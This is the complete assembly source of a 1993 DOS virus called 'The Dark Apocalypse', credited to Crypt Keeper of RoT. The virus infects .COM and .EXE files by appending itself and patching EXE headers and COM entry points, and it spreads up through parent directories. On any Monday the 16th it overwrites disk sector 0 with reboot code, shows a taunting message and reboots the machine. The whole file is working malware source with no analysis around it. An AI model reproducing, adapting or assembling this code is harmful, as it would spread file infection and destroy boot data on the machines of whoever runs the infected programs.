;****************************************************************************
;*                            The Dark Apocalypse                           *
;*                         1993 by Crypt Keeper RoT                         *
;****************************************************************************

;Parasitic Non-Resident .COM and .EXE infector
;Activation : Monday 16th (Fri 13, Sat 14, Sun 15, ...)

;This virus is a parasitic infector of .COM and .EXE files and is traversal
;(infects more than the directory it is in) using the "CD .." method.  It
;infects files by appending to the end.  It triggers on any Monday 16th,
;replacing the boot sector with code to reboot the machine.
;COMMAND.COM is never infected.

CODE    SEGMENT
    ASSUME CS:CODE,DS:CODE,ES:CODE,SS:CODE

VTOP    EQU $                      ;Top of virus code

;Equates --------------------------------------------------------------------

VLENGTH EQU VBOT-VTOP              ;Length of virus in bytes
MAXINF  EQU 3                      ;Max files to infect in each directory
VLPARA  EQU (VLENGTH/16)+1         ;Virus length in paragraphs
IDWORD  EQU 0FFEEh                 ;ID word (for EXE files)

;----------------------------------------------------------------------------

    LEA AX,[BP+(OFFSET(STACK1)+64)] ;Get stack pointer
    MOV SP,AX

    CALL GETDELTA
GETDELTA:
    POP BP
    SUB BP,OFFSET(GETDELTA)        ;Find delta offset

    PUSH DS
    PUSH ES                        ;Save original segment regs (EXE)

    PUSH CS
    POP DS
    PUSH CS
    POP ES                         ;Set up new segments

    CLD                            ;Clear direction flag

    LEA SI,[BP+OFFSET(ORIGBYT)]
    LEA DI,[BP+OFFSET(OLD_OB)]
    MOV CX,BCLEN
    REP MOVSB                      ;Shadow saved bytes into buffer

    LEA SI,[BP+OFFSET(ORIG_IP)]
    LEA DI,[BP+OFFSET(ORIGIP)]
    MOV CX,4
    REP MOVSW                      ;Shadow EXE header information

    MOV AH,2Ah                     ;Get date
    INT 21h

    CMP AL,1                       ;Monday?
    JNE NOTRIGGER                  ;If not, don't trigger

    CMP DL,16                      ;The 16th?
    JNE NOTRIGGER                  ;If not, don't trigger

    MOV AH,19h                     ;Get default drive
    INT 21h

    LEA BX,[BP+OFFSET(REBOOTCOD)]  ;Offset of reboot code
    MOV CX,1                       ;Number of sectors to write
    XOR DX,DX                      ;Start at absolute sector 0

    INT 26h                        ;Absolute disk write
    JC WRITE_ERROR                 ;Skip POPF if error

    POPF                           ;Pop flags (after INT 26h return)
WRITE_ERROR:
    LEA DX,[BP+OFFSET(MESSAGE)]    ;Display message
    MOV AH,9                       ;Print string
    INT 21h

    INT 05h                        ;Print screen
    
    XOR AH,AH                      ;Read keyboard
    INT 16h                        ;BIOS keyboard interrupt

    JMP REBOOTCOD                  ;Reboot the machine
NOTRIGGER:
    LEA SI,[BP+OFFSET(ORIGDIR)]    ;Save original directory name
    XOR DL,DL                      ;from current drive

    MOV AH,47h                     ;Get current directory
    INT 21h
DIRSCAN:
    LEA SI,[BP+OFFSET(OLDDIR)]     ;Save old directory name
    XOR DL,DL                      ;from current drive

    MOV AH,47h                     ;Get current directory
    INT 21h

    MOV AX,WORD PTR [BP+OFFSET(OLDDIR)] ;Get first 2 bytes of old DIR
    CMP AX,'\'                    ;Root directory?
    JE NOMORE_DIRS                 ;If so, end scan

    MOV DL,[BP+OFFSET(COMID)]
    PUSH DX                        ;Save COM ID

    CALL INFECT                    ;Attempt to infect files in directory

    POP DX
    MOV [BP+OFFSET(COMID)],DL      ;Restore COM ID

    LEA DX,[BP+OFFSET(CHDIR)]      ;Offset of directory name

    MOV AH,3Bh                     ;Change current directory
    INT 21h

    JC NOMORE_DIRS                 ;If error, end scan
    JMP SHORT DIRSCAN
NOMORE_DIRS:
    LEA DX,[BP+OFFSET(ORIGDIR)]    ;Reset original directory
    
    MOV AH,3Bh                     ;Change current directory
    INT 21h
    
    MOV DL,0FFh
    CMP [BP+OFFSET(COMID)],DL      ;Is this a .COM file
    JE RET_COM                     ;If so, execute .COM file return
    
    MOV AH,51h                     ;Get PSP adress
    INT 21h

    ADD BX,16                      ;Compensate for PSP size

    POP ES
    POP DS                         ;Restore original ES and DS from EXE
    
    CLI                            ;Clear interrupts for stack change

    MOV AX,CS:[BP+OFFSET(ORIGSP)]
    MOV SP,AX
    MOV AX,CS:[BP+OFFSET(ORIGSS)]
    ADD AX,BX                      ;Find segment for SS
    MOV SS,AX                      ;Reset original EXE stack
    
    STI

    ADD CS:[BP+OFFSET(ORIGCS)],BX  ;Find segment for CS

    JMP DWORD PTR CS:[BP+OFFSET(ORIGIP)] ;Far jump to original EXE code
RET_COM:
    POP AX
    POP AX                         ;Get "EXE stuff" off stack

    LEA SI,[BP+OFFSET(OLD_OB)]     ;Original bytes from .COM file
    MOV DI,100h                    ;Put at .COM entry point
    MOV CX,BCLEN                   ;Move length of original bytes
    
    REP MOVSB                      ;Replace bytes of original .COM file
    
    MOV AX,100h
    PUSH AX
    RET                            ;Jump to original .COM code
                    
INFECT:
    MOV AH,2Fh                     ;Get disk transfer adress
    INT 21h

    MOV [BP+OFFSET(OLDDTAS)],ES
    MOV [BP+OFFSET(OLDDTAO)],BX    ;Old disk transfer adress

    PUSH CS
    POP ES

    LEA DX,[BP+OFFSET(NEWDTA)]     ;New disk transfer adress

    MOV AH,1Ah                     ;Set disk transfer adress
    INT 21h

FINDEXE:
    XOR SI,SI                      ;Zero counter

    MOV CX,4                       ;Search for all normal files
    LEA DX,[BP+OFFSET(SSPEC1)]     ;Search for *.EXE

    MOV AH,4Eh                     ;Find first file
    INT 21h

    JNC DISEASE_EXE                ;Carry set means no more .EXE files
    JMP NOMORE_EXE
FIND_NEXT_EXE:
    MOV AH,4Fh                     ;Find next file
    INT 21h

    JNC DISEASE_EXE                ;Carry set means no more .EXE files
    JMP NOMORE_EXE
DISEASE_EXE:
    XOR CX,CX                      ;Set attributes to normal
    LEA DX,[BP+OFFSET(FNAME)]      ;on file to infect

    MOV AX,4301h                   ;Set file atttibutes
    INT 21h

    MOV AX,3D02h                   ;Open file for READ/WRITE access
    INT 21h

    MOV [BP+OFFSET(THANDLE)],AX    ;File handle

    MOV BX,AX
    MOV CX,28                      ;Read 28 bytes (EXE header)
    LEA DX,[BP+OFFSET(EXEHEADER)]  ;Exe header buffer

    MOV AH,3Fh                     ;Read file or device
    INT 21h

    MOV AX,IDWORD
    CMP [BP+OFFSET(SSSP)],AX       ;Is EXE already infected?
    JNE GO_AHEAD_INFECT            ;If not, go ahead
    JMP END_EXE_INFECTION          ;If so, end routine

GO_AHEAD_INFECT:
    XOR AX,AX
    MOV [BP+OFFSET(COMID)],AL      ;Zero .COM ID field

    PUSH SI                        ;Save counter

    LES SI,[BP+OFFSET(CSIP)]       ;Get CS:IP from EXE header
    MOV [BP+OFFSET(ORIG_IP)],SI
    MOV [BP+OFFSET(ORIG_CS)],ES    ;Set fields in virus code

    LES SI,[BP+OFFSET(SSOFS)]      ;Get SP:SS (reversed) from EXE header
    MOV [BP+OFFSET(ORIG_SP)],ES
    MOV [BP+OFFSET(ORIG_SS)],SI    ;Set fields in virus code

    POP SI                         ;Restore counter

    PUSH CS
    POP ES

    XOR CX,CX
    XOR DX,DX                      ;Move file pointer zero bytes

    MOV AX,4202h                   ;Move to end of file
    INT 21h

    MOV CX,16
    DIV CX                         ;Divide file size by 16 (paragraph)

    PUSH AX
    SUB AX,[BP+OFFSET(HEADSIZ)]    ;Subtract header size from paragraphs

    POP CX
    CMP AX,CX
    JA END_EXE_INFECTION           ;If file too small, end infection

    MOV [BP+OFFSET(CSIP)],DX
    MOV [BP+OFFSET(CSOFS)],AX      ;Set CS:IP in EXE header

    MOV [BP+OFFSET(SSOFS)],AX
    MOV CX,0FFEEh
    MOV [BP+OFFSET(SSSP)],CX       ;Set SS:SP in EXE header

    MOV CX,VLPARA
    ADD [BP+OFFSET(MINMEM)],CX     ;Add virus size in paragraphs to minmem

    MOV AX,[BP+OFFSET(ID_WORD)]    ;Get ID word from EXE header
    CMP AX,'MZ'
    JE EXE_OK
    CMP AX,'ZM'
    JE EXE_OK                      ;If a true EXE file, go ahead

    JMP SHORT END_EXE_INFECTION    ;If not (misnamed COM), end infection

EXE_OK: MOV BX,[BP+OFFSET(THANDLE)]    ;Handle of target file
    MOV CX,VLENGTH                 ;Write virus length in bytes
    MOV DX,BP                      ;BP=Start of virus code
    
    MOV AH,40h                     ;Write file or device
    INT 21h
    
    XOR CX,CX
    XOR DX,DX                      ;Move file pointer zero bytes

    MOV AX,4202h                   ;Move to end of file
    INT 21h
    
    MOV CX,512                     ;Divide by 512 bytes (page)
    DIV CX

    CMP DX,00h
    JE GO_AHEAD_SET                ;If no remainder, go ahead and set

    INC AX                         ;Add another page (last page)

GO_AHEAD_SET:
    MOV [BP+OFFSET(TOTPAGE)],AX
    MOV [BP+OFFSET(LAST512)],DX    ;Set new EXE file size

    CALL SEEKZERO                  ;Seek to position zero in file
    
    MOV CX,28                      ;Length of EXE header
    LEA DX,[BP+OFFSET(EXEHEADER)]  ;Offset of header data
    
    MOV AH,40h                     ;Write file or device
    INT 21h
    
    INC SI                         ;Increment counter
END_EXE_INFECTION:
    MOV BX,[BP+OFFSET(THANDLE)]    ;Handle of target file
    MOV AH,3Eh                     ;Close file with handle
    INT 21h
    
    CALL RESET_ATTR                ;Reset original attributes
    
    CMP SI,MAXINF                  ;Maximum counter reached?
    JNE FNE                        ;If so, end all searches for directory
    JMP NOMORE_FILES

FNE:    JMP FIND_NEXT_EXE              ;Find next file

RESET_ATTR:
    MOV CX,[BP+OFFSET(ATTRIB)]     ;Reset old attributes
    LEA DX,[BP+OFFSET(FNAME)]      ;on file just infected
    
    MOV AX,4301h                   ;Set file attributes
    INT 21h
    RET                            ;Return to caller

SEEKZERO:
    XOR CX,CX
    XOR DX,DX                      ;Change offset = 0

    MOV AX,4200h                   ;Move from beginning of file
    INT 21h
    RET                            ;Return to caller

NOMORE_EXE:
    MOV CX,4                       ;Search for all normal files
    LEA DX,[BP+OFFSET(SSPEC2)]     ;Search for *.COM
    
    MOV AH,4Eh                     ;Find first file
    INT 21h
    
    JNC DISEASE_COM                ;Carry set means error
    JMP NOMORE_FILES
FIND_NEXT_COM:
    MOV AH,4Fh                     ;Find next file
    INT 21h

    JNC DISEASE_COM                ;Carry set means error
    JMP NOMORE_FILES
DISEASE_COM:
    XOR CX,CX                      ;Set attributes to normal
    LEA DX,[BP+OFFSET(FNAME)]      ;on file to infect

    MOV AX,4301h                   ;Set file atttibutes
    INT 21h

    PUSH SI                        ;Save counter

    MOV SI,DX
    LEA DI,[BP+OFFSET(CS2)]        ;Compare with "COMMAND.COM"
    MOV CX,12                      ;11 bytes to compare

    REPE CMPSB                     ;Repeat until not equal

    POP SI                         ;Restore counter
    
    CMP CX,0                       ;All characters match?
    JE END_COM_INFECTION           ;If so, end infection routine

    MOV AX,3D02h                   ;Open file for READ/WRITE access
    INT 21h

    MOV BX,AX
    MOV CX,2                       ;Read one word of data
    LEA DX,[BP+OFFSET(CHKBUF)]     ;Buffer for word to check
    
    MOV AH,3Fh                     ;Read file or device
    INT 21h
    
    MOV AX,[BP+OFFSET(CHKBUF)]
    CMP AX,'MZ'
    JE END_COM_INFECTION
    CMP AX,'ZM'
    JE END_COM_INFECTION           ;End infection if misnamed .EXE
    
    CMP AX,WORD PTR [BP+OFFSET(BRANCH)] ;Compare with start of branch code
    JE END_COM_INFECTION           ;End infection if already infected

    CALL SEEKZERO                  ;Seek to position zero in file

    MOV CX,BCLEN                   ;Length of branch code
    LEA DX,[BP+OFFSET(ORIGBYT)]    ;Save original bytes from COM file

    MOV AH,3Fh                     ;Read file or device
    INT 21h

    XOR CX,CX
    XOR DX,DX                      ;Move file pointer zero bytes

    MOV AX,4202h                   ;Move to end of file
    INT 21h
    
    ADD AX,100h                    ;Compensate for PSP
    MOV [BP+OFFSET(VOFFSET)],AX    ;Store virus offset in repeat code

    XOR AX,AX
    MOV [BP+OFFSET(COMID)],AH      ;Zero .COM ID field

    MOV CX,VLENGTH
    MOV DX,BP                      ;Delta offset = start of code

    MOV AH,40h                     ;Write file or device
    INT 21h

    CALL SEEKZERO                  ;Seek to position zero
    
    MOV CX,BCLEN                   ;Length of branch code
    LEA DX,[BP+OFFSET(BRANCH)]     ;Write branch code

    MOV AH,40h                     ;Write file or device
    INT 21h

    INC SI                         ;Increment counter
END_COM_INFECTION:
    MOV AH,3Eh                     ;Close file with handle
    INT 21h
    
    CALL RESET_ATTR                ;Reset original attributes
    
    CMP SI,MAXINF                  ;Maximum counter reached?
    JE NOMORE_FILES                ;If so, end all searches for directory

    JMP FIND_NEXT_COM              ;Find next .COM file
NOMORE_FILES:
    LDS DX,[BP+OFFSET(OLDDTAO)]    ;Get old disk transfer adress

    MOV AH,1Ah                     ;Set disk transfer adress
    INT 21h
    
    PUSH CS
    POP DS

    RET                            ;Return to caller

;Reboot code ----------------------------------------------------------------

REBOOTCOD:
    MOV AX,0040h
    MOV DS,AX
    MOV BX,1234h
    MOV WORD PTR DS:[0072h],BX     ;Warm reboot
    DB  0EAh
    DW  0
    DW  0FFFFh                 ;JMP FFFF:0000 (hard coded)
        
;Branch code ----------------------------------------------------------------

BCTOP   EQU $                      ;Top of branch code

BRANCH: XOR BP,DI                      ;Marker instruction
    DB  0BBh                   ;MOV BX,
VOFFSET DW  0                      ;Offset of viral code
    MOV DI,OFFSET(COMID)
    ADD DI,BX                      ;Calculate location of COM id

    MOV AL,0FFh
    STOSB                          ;Set COM file flag

    PUSH BX
    RET                            ;Jump to virus code

BCBOT   EQU $                      ;Bottom of branch code
BCLEN   EQU BCBOT-BCTOP            ;Length of branch code

;Data -----------------------------------------------------------------------

CS2 DB  'COMMAND.COM',0        ;File to replace with reboot code
    DB  0FFh

CHDIR   DB  '..',0                 ;Change directory string

MESSAGE DB  13,10
    DB  'Welcome to the Dark Apocalypse...  Your computer will',13,10
    DB  'never escape... You might as well read this and weep!',13,10
    DB  13,10
    DB  'The Dark Apocalypse v1.00  by Crypt Keeper [RoT]',13,10
    DB  '���Reign of Terror���  [DARK APOCALYPSE]',13,10
    DB  13,10
    DB  'Press any key to continue...$'

ORIG_IP DW  0
ORIG_CS DW  0
ORIG_SS DW  0
ORIG_SP DW  0                      ;Original segments/pointers from EXEHDR

SSPEC1  DB  '*.EXE',0
SSPEC2  DB  '*.COM',0              ;Search specs

ORIGBYT DB  0CDh
    DB  20h                    ;For proper .COM return to DOS
    DB  BCLEN-2 DUP ('!')      ;Buffer for saved bytes from .COM files

COMID   DB  0FFh                   ;ID byte set to 0FFh by branch if .COM

;----------------------------------------------------------------------------

VBOT    EQU $                      ;Bottom of virus code

;Heap -----------------------------------------------------------------------

ORIGIP  DW  0
ORIGCS  DW  0
ORIGSS  DW  0
ORIGSP  DW  0                      ;Shadowed EXEHDR information

EXEHEADER:
ID_WORD DW  0                      ;ID word (ZM or MZ)
LAST512 DW  0                      ;Number of bytes in last 512 byte page
TOTPAGE DW  0                      ;Total number of pages in file
SEGENTS DW  0                      ;Number of entries in segment table
HEADSIZ DW  0                      ;Size of header in paragraphs
MINMEM  DW  0                      ;Minimum memory in paragraphs
MAXMEM  DW  0                      ;Maximum memory in paragraphs
SSOFS   DW  0                      ;Offset of SS from header (paragraphs)
SSSP    DW  0                      ;Stack pointer offset
NEGCHK  DW  0                      ;Negative checksum (ignored by DOS)
CSIP    DW  0                      ;Offset of IP from CS (bytes)
CSOFS   DW  0                      ;Offset of CS from header (paragraphs)
RELOFS  DW  0                      ;Offset of relocation table from loc 0
OVLNUM  DW  0                      ;Overlay number (ignored)

CHKBUF  DW  0                      ;Buffer for infection check (COM files)
VSEG    DW  0                      ;Segment of virus in RAM
THANDLE DW  0                      ;File handle

OLDDIR  DB  70 DUP ('?')           ;Buffer for old directory name
ORIGDIR DB  70 DUP ('?')           ;Buffer for original directory name

OLDDTAO DW  0
OLDDTAS DW  0                      ;Old disk transfer adress

OLD_OB  DB  BCLEN DUP ('%')        ;Buffer for shadow of old original code

STACK1  DB  64 DUP ('S')           ;Stack

NEWDTA:
    DB  21 DUP (' ')           ;Reserved
ATTRIB  DB  0                      ;Attributes of found file
FTIME   DW  0                      ;Time of last write
FDATE   DW  0                      ;Date of last write
FSIZE   DD  0                      ;File size
FNAME   DB  13 DUP ('?')           ;File name

;----------------------------------------------------------------------------

CODE    ENDS
    END
